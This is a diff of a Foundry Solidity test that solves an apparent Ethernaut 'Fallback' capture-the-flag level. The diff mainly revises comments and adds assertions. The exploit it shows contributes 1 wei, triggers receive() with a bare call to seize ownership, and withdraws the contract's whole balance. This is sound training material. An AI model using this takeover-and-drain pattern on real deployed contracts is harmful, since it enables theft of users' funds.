@@ -60,17 +60,18 @@ contract FallbackTest is Test {
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        //Triggering contribute function with value greater than 0
+        //Contribute with a small amount of ether to be added to the contributions mapping
         fallbackContract.contribute{value: 1}();
         emit log_named_uint(
             "Attackers's contribution: ",
             fallbackContract.getContribution()
         );
 
-        // Triggering the fallback function - we need to send a transaction to the contract without indicating a method. We are going to use global function call
+        // Trigger the fallback function (receive()) to gain ownership of the contract.
         (bool success, ) = address(fallbackContract).call{value: 1}("");
         require(success, "call failed");
 
+        // Confirm the ownership of the contract has changed
         emit log_named_address(
             "New owner of the contract: ",
             fallbackContract.owner()
@@ -81,13 +82,18 @@ contract FallbackTest is Test {
             address(fallbackContract).balance
         );
 
-        // Withdrawing contract balance
+        // Withdraw all the funds
         fallbackContract.withdraw();
 
         emit log_named_uint(
             "Balance of the contract after withdrawal: ",
             address(fallbackContract).balance
         );
+
+        // Test assertion
+        assertEq(fallbackContract.owner(), attacker);
+
+        assertEq(address(fallbackContract).balance, 0);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
